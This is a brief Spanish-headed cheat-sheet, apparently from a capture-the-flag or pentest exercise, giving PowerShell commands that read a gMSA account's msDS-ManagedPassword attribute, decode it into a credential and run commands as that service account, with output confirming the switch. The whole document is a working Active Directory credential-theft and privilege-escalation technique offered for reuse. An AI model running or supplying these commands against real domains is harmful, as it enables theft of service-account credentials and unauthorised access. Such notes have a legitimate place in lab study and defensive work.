
# EJECUCIÓN DED COMANDOS DESDE OTRO USUARIO
```shell
Get-ADServiceAccount -Identity 'BIR-ADFS-GMSA' -Properties 'msDS-ManagedPassword'
$gmsa = Get-ADServiceAccount -Identity 'BIR-ADFS-GMSA' -Properties 'msDS-ManagedPassword'
$mp = $gmsa.'msDs-ManagedPassword'
ConvertFrom-ADManagedPasswordBlob $mp
$secpw = (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword
$cred = New-Object System.Management.Automation.PScredential '[EL USUARIO AL QUE PODEMOS ELEVAR]',$secpw
Invoke-Command -ComputerName localhost -Cred $cred -ScriptBlock {whoami}
	=====> search\bir-adfs-gmsa$
```
